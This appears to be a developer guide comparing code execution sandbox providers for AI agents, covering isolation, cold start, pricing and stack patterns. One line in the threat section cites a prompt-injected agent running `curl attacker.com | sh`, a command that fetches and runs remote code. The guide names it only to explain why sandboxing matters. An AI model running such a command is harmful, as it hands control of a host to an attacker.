# Code Execution Sandbox Providers for AI Agents: E2B, Modal, Daytona, Vercel Sandbox, Cloudflare Sandbox, Northflank, Blaxel, Riza

[⬅️ AI Development Overview](../ai-development/)

If you're building an AI agent that writes code, runs scripts, processes user files, or executes shell commands, you need somewhere to actually run that code. Running it in your own backend is a one-way ticket to a security incident — agent-generated code is untrusted code, even when the agent is yours. The category that solved this is the AI code execution sandbox: ephemeral microVMs or hardened containers that boot in milliseconds, run arbitrary code with full filesystem and network primitives, and disappear when the work is done.

The market matured in 2025 and went mainstream in 2026. Every major coding agent now sits on top of one of these sandbox runtimes. The question is no longer "should we sandbox agent code" but "which sandbox primitive matches our latency, persistence, and isolation profile."

This page is distinct from [AI Agent Frameworks](./ai-agent-frameworks.md), [Coding Harnesses](./coding-harnesses.md), [Cloud Coding Agents](./cloud-coding-agents.md), and the [Cloud Development Environments](../devops-and-tools/cloud-development-environments.md) page. A sandbox provider is the runtime substrate underneath those tools — the thing that actually executes the bash, Python, or Node command an agent decides to run.

## TL;DR Decision Matrix

| Provider | Isolation | Cold Start | Runtimes | Persistence | Pricing Floor | Best For |
|---|---|---|---|---|---|---|
| **E2B** | Firecracker microVM | ~200ms | Python, Node, R, Java, Bash | Snapshot/restore; 30-day auto-delete | Free tier + usage | Code interpreter pattern; Jupyter-style agent tools |
| **Modal** | gVisor + container | ~2–4s | Python-first | Long-running; checkpointing | Free tier + usage | GPU-heavy AI workloads; long sessions |
| **Daytona** | Kata Containers / Docker | ~90ms | Multi-language; devcontainers | Persistent workspaces | Enterprise pricing | Reproducible agent dev environments |
| **Vercel Sandbox** | Firecracker microVM | sub-second | Node 22/24, Python 3.13 | Ephemeral only; 5min–5hr max | $0.128/CPU-hr | Web-centric agents; Vercel-native stack |
| **Cloudflare Sandbox SDK** | Workers + Durable Objects | edge-fast | JavaScript, Wasm | Per-DO state | Workers pricing | Edge-distributed agents; low-latency |
| **Northflank** | Firecracker + Kata + gVisor | 1–2s | Multi-language; GPU | Ephemeral or persistent | Usage-based | Production multi-tenant agent infra; BYOC |
| **Blaxel** | microVM | ~25ms (warm) | Multi-language | Standby + resume | Usage-based | Compliance-heavy agents (SOC2/HIPAA/ISO) |
| **CodeSandbox SDK** (Together) | microVM | ~2s restore | Multi-language | Snapshot hibernation | Together credits | Stateful agent workspaces; long-running tasks |
| **Riza** | Wasm-isolated | <50ms | JS, Python, PHP, Ruby | Stateless | Pay-per-call | Lightweight code eval inside agent loops |
| **Fly.io Machines** | Firecracker microVM | 1–3s | Any container | Volume-backed | Pay-per-second | DIY sandbox layer with global regions |
| **Val Town** | V8 isolates | <100ms | TypeScript/JS | Persistent vals | Free tier + usage | Quick agent-as-script execution |
| **OpenAI Code Interpreter** | Bundled with Responses/Assistants | hidden | Python | Per-session file system | Bundled in API | Code-eval inside OpenAI agents only |
| **Anthropic Code Execution tool** | Bundled with Claude API | hidden | Python; bash | Per-session | Bundled in API | Code-eval inside Claude agents only |
| **Bundled-with-agent sandboxes** | Codex CLI, Claude Code bash tool | local | host shell w/ guardrails | host FS | Free (local) | Local agent loops; not for multi-tenant prod |

## What Sandboxes Actually Solve

The temptation, when you ship your first agent, is to give it a thin shell wrapper inside your existing backend and call it done. That works for demos and breaks the day a prompt-injection payload makes your agent run `curl attacker.com | sh`. The threats are concrete:

- **Untrusted code execution.** Even your own model can be steered by user input. A sandbox is the boundary that contains that.
- **Filesystem and secret leakage.** Anything in your app environment is reachable from a process inside it. A sandbox starts empty.
- **Resource exhaustion.** A misbehaving loop in agent code shouldn't take down your API. A sandbox has CPU/memory/time caps.
- **Network exfil.** Agent-written code probably should not be able to POST to arbitrary endpoints. Sandboxes can lock egress to allow-lists.
- **Reproducibility.** Each invocation starts from a known base image. No state drift, no "works in production but not in CI."

The historical answer was "spin up a container per request." Containers boot in seconds, which is fine for batch and bad for interactive agents. The 2025–2026 shift was the productization of **Firecracker microVMs** (the AWS Lambda primitive) as a developer-facing API. A microVM gets you VM-grade isolation with container-speed boot times — typically sub-second. Most modern sandbox providers run Firecracker, some run gVisor, some run Wasm or V8 isolates for lighter weight.

## Decide Before You Pick

Six questions before you compare vendors.

### 1. Ephemeral or persistent?

- **Ephemeral**: one-shot execution; nothing survives. Right for code interpreter patterns, single-tool calls, agent thought-execute-discard loops. E2B, Vercel Sandbox, Modal one-shot, Riza, Val Town fit.
- **Persistent**: workspace state carries across calls. Right for long-running agent sessions, Devin-style coding agents, multi-step refactors that touch the same repo. Daytona, CodeSandbox SDK, Modal long-running, Northflank persistent fit.
- Many providers offer both modes; the difference is how naturally they support each.

### 2. What's the cold start budget?

- **<100ms**: edge-class only — Cloudflare Sandbox SDK, Val Town, Blaxel resume, Riza, Daytona warm pool.
- **100–500ms**: most Firecracker providers — E2B, Vercel Sandbox.
- **1–3s**: containerized providers — Modal, Northflank, Fly Machines.
- **3s+ acceptable**: any provider; the GPU ones often live here.

Cold start matters if you're running the sandbox inside an interactive chat turn. If the sandbox is a step in a longer agent run, cold start is irrelevant.

### 3. Do you need GPU?

If your agent runs vision models, fine-tuning steps, or heavy inference inside the sandbox, you need GPU. Modal is the obvious answer. Northflank, Koyeb, and Fly Machines also offer GPU sandboxes. Most ephemeral microVM products (E2B, Vercel Sandbox, Cloudflare) are CPU-only.

### 4. Multi-tenancy and isolation grade.

If you're running other people's agents (a platform), the isolation guarantees matter for your security model:

- **Firecracker microVM**: hypervisor isolation; the highest practical bar.
- **gVisor**: syscall-filtered containers; lower than VM but better than Docker.
- **Kata Containers**: lightweight VMs underneath the container API.
- **Wasm / V8 isolates**: process-level isolation; great for stateless eval, weaker for full OS workloads.

For B2B SaaS where the customer's agent runs your customer's code, default to microVM. For internal-only agents where you wrote and approve every code path, isolation grade is less load-bearing.

### 5. Egress and data policy.

- Locked allow-list networking: E2B, Vercel Sandbox, Northflank, Blaxel.
- Full open egress: most by default.
- Air-gapped: bring your own — Northflank BYOC, Fly Machines in private regions, self-hosted Firecracker.
- Compliance frameworks (SOC2, HIPAA, ISO 27001): Blaxel, Northflank, Daytona enterprise tiers.

### 6. Ecosystem lock-in.

- Already on Vercel? Vercel Sandbox is the path of least resistance.
- Already on Cloudflare Workers + Durable Objects? Cloudflare Sandbox SDK.
- Already on Together for inference? Together's CodeSandbox SDK integration.
- Building a coding agent of your own from scratch with no platform preference? E2B has the most agent-friendly SDK and the largest community.

## Provider Deep-Dives

### E2B

**What**: open-source Firecracker microVM sandboxes with an agent-friendly SDK. The most common "code interpreter" backend among indie agent builders.

**Strengths**: Jupyter-style execution semantics (stateful kernel across calls in a session); fast snapshot/restore; first-class Python and JavaScript SDKs; large community of agent templates. Open-source CLI and SDK; can self-host the infra if you outgrow the cloud.

**Weaknesses**: sandboxes auto-delete after 30 days of inactivity; pricing scales with session-seconds, which adds up if you keep many warm.

**Use when**: building a custom agent that needs a Jupyter-like execution surface; want the largest off-the-shelf SDK ergonomics; comfortable with usage-based pricing.

### Modal

**What**: Python-first serverless compute platform with a sandbox primitive on top. Built around "decorate a Python function, it runs in the cloud."

**Strengths**: best GPU story in the sandbox category; long-running and checkpointable; the SDK feels native to Python developers; container image build caching is fast.

**Weaknesses**: Python-centric — other runtimes work but feel grafted on; cold start is multi-second for many workloads.

**Use when**: your agent's tool layer is mostly Python; you need GPU; you want one platform for both inference and code execution.

### Daytona

**What**: developer environment platform that productized "open this repo in a working dev sandbox in 90ms." Used both for human IDEs and as an agent backend.

**Strengths**: very fast warm starts; git + devcontainer support means agents inherit reproducible environments; persistent workspaces survive across agent runs.

**Weaknesses**: less ephemeral-first than E2B or Vercel Sandbox; pricing leans enterprise.

**Use when**: agent workloads benefit from persistent state (Devin-style refactor agents, long-lived coding sessions); reproducible per-repo environments matter; you already use devcontainers.

### Vercel Sandbox

**What**: Firecracker microVM primitive exposed through `@vercel/sandbox`. GA since January 2026. Integrates natively with Vercel deployments. See the standalone [Vercel Sandbox](../cloud-and-hosting/vercel-sandbox.md) page for a full breakdown.

**Strengths**: zero-config auth from a Vercel deployment in the same team; per-domain egress allow-list; the Firecracker fleet is the same one running Vercel builds, so the underlying infrastructure is well-exercised.

**Weaknesses**: ephemeral-only — no persistent workspace mode; runtime list is narrower than competitors (Node 22/24, Python 3.13); maximum lifetime caps at 5 hours.

**Use when**: web-centric agents; already on Vercel; want pay-per-CPU-hour billing with no separate vendor.

### Cloudflare Sandbox SDK

**What**: sandboxes built on Workers + Durable Objects, distributed across Cloudflare's edge.

**Strengths**: edge-fast cold starts; runs close to users; integrates with the Cloudflare data plane (R2, KV, D1, Durable Objects); pricing scales with Workers economics.

**Weaknesses**: runtime is JavaScript and Wasm — full OS-level workloads don't run here; less suited to "shell out to git" patterns.

**Use when**: latency-critical agents; existing Workers stack; JS or Wasm code execution is the dominant pattern.

### Northflank

**What**: production platform that supports sandbox-style ephemeral workloads alongside long-running services, jobs, and managed databases.

**Strengths**: multi-tenant isolation with a choice of Firecracker, Kata, or gVisor depending on tier; BYOC across AWS / GCP / Azure; GPU support; SOC 2 Type 2; broadest "production platform underneath your agent" coverage.

**Weaknesses**: more platform than primitive — the surface area is wider than "give me a sandbox," which is overkill for some teams.

**Use when**: building a multi-tenant platform where you also need databases, jobs, and APIs around the sandbox; need BYOC; compliance-driven enterprise.

### Blaxel

**What**: microVM sandbox provider focused on compliance and standby-resume economics.

**Strengths**: sub-25ms resume from standby at zero compute cost when idle; SOC 2 Type II, HIPAA, and ISO 27001; pricing model rewards bursty agent workloads.

**Weaknesses**: smaller community than E2B; SDK ergonomics still maturing.

**Use when**: compliance is non-negotiable; agent workload is bursty (many idle sandboxes, occasional bursts of work); standby-resume economics are a fit.

### CodeSandbox SDK (Together AI)

**What**: CodeSandbox's microVM sandbox primitive, now integrated with Together AI for agent use cases.

**Strengths**: fast snapshot/restore (~2s); customizable hibernation; built-in dev environment ergonomics; tight pairing with Together inference for "model + sandbox" stacks.

**Weaknesses**: pricing is bundled with Together credits — opaque if you're not already a Together customer.

**Use when**: building stateful agent workspaces; already on Together for model inference; want long-lived sessions with hibernation rather than ephemeral one-shots.

### Riza

**What**: lightweight code execution primitive built on Wasm isolation. Designed for "let the agent call a tool that runs a snippet."

**Strengths**: very fast and very cheap for small code runs; multi-language (JS, Python, PHP, Ruby); no microVM cold start.

**Weaknesses**: Wasm sandboxing means no full OS, no shell, no `apt install`; the surface is "evaluate this code snippet," not "run an interactive shell."

**Use when**: agent tool layer needs to safely run user-submitted formulas, expressions, or pure-function snippets; not the right answer for "let an agent build a repo."

### Fly.io Machines

**What**: not a dedicated sandbox SDK but commonly used as one — Fly Machines are Firecracker microVMs you can boot and tear down per request via API.

**Strengths**: global region coverage; volume-backed persistent storage; pay-per-second billing; no opinions about what you run.

**Weaknesses**: you build the sandbox abstraction yourself — image management, lifecycle, allow-listing, eviction. Less batteries-included than E2B or Vercel Sandbox.

**Use when**: DIY sandbox layer with full control; need to run in specific regions; already a Fly customer.

### Val Town

**What**: TypeScript-first execution-as-a-platform built on V8 isolates. Each "val" is a hosted function or script that runs in milliseconds.

**Strengths**: lowest friction "agent writes a script, run it" loop; persistent vals double as cron jobs and HTTP endpoints; very cheap.

**Weaknesses**: V8 isolate constraints — no arbitrary binaries, no native modules outside the supported list.

**Use when**: agent output is small TypeScript snippets you want to deploy and run instantly.

### OpenAI Code Interpreter (Responses / Assistants)

**What**: hosted Python sandbox bundled with OpenAI's Responses and Assistants APIs.

**Strengths**: zero ops — turn on a tool, the model can write and run Python with file uploads; tightly integrated with the model loop.

**Weaknesses**: only usable from OpenAI's agent runtime; you can't bring this sandbox to another model; visibility into the underlying environment is limited.

**Use when**: building inside OpenAI's agent stack; don't need to run code outside that loop.

### Anthropic Code Execution Tool

**What**: code execution as a server-side tool for Claude models. Python and bash inside Anthropic's hosted sandbox.

**Strengths**: zero infrastructure; tight integration with Claude's tool-calling; reasonable defaults for safety.

**Weaknesses**: Anthropic-only; opaque environment.

**Use when**: inside the Claude API stack; want code execution without standing up a separate sandbox vendor.

### Bundled-with-agent sandboxes (Codex CLI, Claude Code, Aider)

**What**: not a separate product — most coding agents ship with a sandboxed bash tool that runs on the host with permission guardrails. Codex CLI uses macOS sandbox profiles or Landlock; Claude Code's bash tool runs with deny-list controls; Aider runs commands with confirmation prompts.

**Strengths**: zero setup, local-fast; right for solo-developer use.

**Weaknesses**: not multi-tenant; not isolated from your host; not a production sandbox.

**Use when**: solo dev loop on your own machine.

## What Sandboxes Won't Fix

- **Bad agent prompts.** A sandbox protects your infra. It does not protect your user from an agent that confidently runs the wrong code.
- **Data poisoning at the model layer.** If the model is jailbroken, the sandbox stops it from breaking out — not from completing the malicious task within its sandbox bounds.
- **Outbound API key abuse.** A sandboxed agent with your API keys can still run up your bill. Use per-call budget controls and short-lived credentials, not just isolation.
- **Cost runaway.** Each provider has its own cost shape. Set CPU-hour, session-time, and concurrency caps in your application code; sandbox vendors give you the knobs but won't tune them for you.
- **Egress to your own infra.** If your sandbox can reach your production database, you don't have a sandbox — you have a security incident with extra steps. Lock the egress allow-list.

See [AI Agent Budgets & Cost Control](./ai-agent-budgets-cost-control.md) and [AI Guardrails & LLM Application Security](./ai-guardrails-llm-application-security.md) for the layers above the sandbox.

## Pragmatic Stack Patterns

### Pattern 1: Code interpreter for a chat product

- Agent: Claude or GPT in a Responses-style loop
- Sandbox: E2B or Vercel Sandbox, ephemeral
- Use: model writes Python or JS to crunch a user file, returns the result
- Cold start budget: ~500ms
- Cost shape: per-CPU-hour, very low per session

### Pattern 2: Long-running coding agent on a repo

- Agent: Claude Code, Codex, or custom agent loop
- Sandbox: Daytona persistent workspace, or CodeSandbox SDK with hibernation
- Use: agent checks out a repo, makes changes across many tool calls, commits and pushes
- Cold start budget: ~100ms warm
- Cost shape: per-workspace-hour; sessions can run minutes to hours

### Pattern 3: Multi-tenant agent platform

- Agent: tenant-supplied agent definitions
- Sandbox: Northflank Firecracker tier or Blaxel
- Use: each tenant gets isolated microVMs; you run the platform
- Cold start budget: 1–2s
- Cost shape: per-tenant attribution; BYOC if a tenant requires it

### Pattern 4: GPU-heavy agent (vision, fine-tune, training)

- Agent: orchestrator that fans out compute tasks
- Sandbox: Modal sandboxes with GPU
- Use: agent prepares data, invokes a GPU sandbox to run training or inference, retrieves output
- Cold start budget: 3–10s (acceptable for batch)
- Cost shape: GPU-second billing

### Pattern 5: Lightweight expression eval

- Agent: tool-using agent in any LLM
- Sandbox: Riza or Val Town
- Use: agent emits a small expression or formula, sandbox evaluates and returns
- Cold start budget: <50ms
- Cost shape: per-call, fractions of a cent

### Pattern 6: Edge-distributed agent

- Agent: latency-sensitive product near the user
- Sandbox: Cloudflare Sandbox SDK on Workers
- Use: agent runs near the user, with sandbox + storage + AI Gateway all on Cloudflare edge
- Cold start budget: edge-fast
- Cost shape: Workers + Durable Object pricing

## Decision Framework

Pick by answering:

**1. Ephemeral or persistent?**
- Ephemeral one-shot: E2B, Vercel Sandbox, Riza, Modal one-shot
- Persistent workspace: Daytona, CodeSandbox SDK, Northflank persistent

**2. Cold start budget?**
- <100ms: Cloudflare, Val Town, Daytona warm, Blaxel resume
- 100ms–1s: E2B, Vercel Sandbox
- 1–3s: Modal, Northflank, Fly Machines

**3. Need GPU?**
- Yes: Modal first; Northflank or Fly Machines next.
- No: any provider above.

**4. Multi-tenancy / isolation grade?**
- Firecracker-grade required: E2B, Vercel Sandbox, Northflank, Blaxel, Fly Machines
- gVisor / Kata acceptable: Modal, Northflank (lower tier), Daytona
- Wasm / isolate acceptable: Cloudflare, Riza, Val Town

**5. Compliance posture?**
- SOC 2 / HIPAA / ISO 27001 hard-required: Blaxel, Northflank, Daytona enterprise
- Standard SOC 2 acceptable: E2B, Vercel Sandbox, Modal

**6. Ecosystem alignment?**
- Vercel-native: Vercel Sandbox
- Cloudflare-native: Cloudflare Sandbox SDK
- Python-native: Modal
- OpenAI-only: OpenAI Code Interpreter
- Anthropic-only: Anthropic Code Execution tool
- Anywhere else: E2B is the strongest default

## Verdict

**For most teams adding a code execution sandbox to an agent**:

- **Default first choice**: **E2B**. Best SDK ergonomics for agents, open-source under the hood, Jupyter-style stateful execution, broad runtime coverage. Most independent agent projects ship with E2B and never have to switch.
- **If you're on Vercel**: **Vercel Sandbox**. One vendor, one bill, native auth, Firecracker isolation.
- **If you're on Cloudflare**: **Cloudflare Sandbox SDK**. Edge-fast, integrates with the rest of the Workers data plane.
- **Long-lived coding agent on a repo**: **Daytona** or **CodeSandbox SDK**. Persistence is the differentiator.
- **GPU workloads**: **Modal**. The Python-first ergonomics are worth the cold start.
- **Multi-tenant platform**: **Northflank** or **Blaxel** depending on whether you need a broader platform or a compliance-first sandbox.
- **Inside an OpenAI or Anthropic agent**: use the bundled code execution tool. It is the fastest path; switch out only when you outgrow it.

**Skip a dedicated sandbox if**:
- You're at the prototype stage and your agent never runs arbitrary code (e.g., only calls fixed APIs). Add a sandbox when the agent's tool surface includes "execute code."
- Your only execution surface is "evaluate one expression." A Wasm primitive like Riza is enough; you don't need a full microVM.
- The agent is single-user, local, and the only user is you. The bundled Codex CLI or Claude Code sandbox is fine until you ship to others.

**The trap to avoid**: rolling your own with a thin Docker wrapper "for now." It works in dev, gets shipped, and ages into a security bug. The category exists because the right answer — a microVM with a managed lifecycle — is now a one-call API. Pay the small cost; skip the incident.

## See Also

- [Vercel Sandbox](../cloud-and-hosting/vercel-sandbox.md) — standalone Vercel Sandbox primer
- [Cloud Development Environments](../devops-and-tools/cloud-development-environments.md) — adjacent category: dev environments for humans
- [AI Agent Frameworks](./ai-agent-frameworks.md) — the agent layer that calls into a sandbox
- [Coding Harnesses](./coding-harnesses.md) — the agent harnesses that orchestrate sandbox calls
- [Cloud Coding Agents](./cloud-coding-agents.md) — hosted coding agents (most run on a sandbox under the hood)
- [AI Agent Budgets & Cost Control](./ai-agent-budgets-cost-control.md) — keep sandbox spend bounded
- [AI Guardrails & LLM Application Security](./ai-guardrails-llm-application-security.md) — defense layers above the sandbox
- [Agent Reliability & Production Operations](./agent-reliability-production-operations.md) — operate sandboxed agents in production
